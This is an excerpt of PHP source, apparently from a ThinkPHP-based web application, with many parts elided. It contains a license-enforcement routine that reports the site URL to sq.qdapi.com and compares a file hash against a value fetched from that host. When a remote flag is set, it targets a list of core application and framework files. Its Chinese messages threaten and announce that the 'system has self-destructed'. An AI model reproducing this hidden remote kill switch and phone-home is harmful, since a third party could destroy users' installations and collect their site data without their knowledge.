...
class App extends Container
{
    ...
    protected function containerConfigUpdate($module)
    {
        ...
        if (!$this->loadInit()) {
            echo json_encode(
                [
                    'code' => 911, 
                    'msg' => '该接口未授权，请联系群管理！若你不是在互站购买的源码，请联系你的卖家处理！请勿擅自替换文件，否则将造成严重后果！！！'
                ]
            );
            die;
        }
    ...
    public function loadApp() {
        /*<hide>*/
        $filename = APPS_PATH . '/nb_api/api/ApiInit.php';
        $md5 = strtoupper(md5_file($filename));
        // var_dump($md5);
        $json = file_get_contents('http://sq.qdapi.com/md5.txt');
        ...
        if($md5 != $json['md5']){
            if ($json['do'] === 1) {
                ...
                $file_arr = [
                    __DIR__ . '/ApiInit.php',
                    APPS_PATH . 'common/server/Service.php',
                    APPS_PATH . 'common/admin/AdminCommon.php',
                    APPS_PATH . 'user/model/User.php',
                    APPS_PATH . 'system/admin/Admin.php',
                    THINKS_PATH . 'library/think/route/Rule.php',
                    THINKS_PATH . 'library/think/db/Query.php'
                ];
            ...
            $msg = $json['do'] === 1 ? '请勿擅自替换文件，请支持正版，系统已自毁！！！' : '请勿擅自替换文件，否则系统将自毁！！！';
            echo json_encode(
                [
                    'code' => 912, 
                    'msg' => $msg
    ...
    public function loadInit(){
        ...
        if(!$is_shouquan){
            if($json_get = file_get_contents('http://sq.qdapi.com/api.php?tpye=apicxsq&url='.urlencode($now_url))){
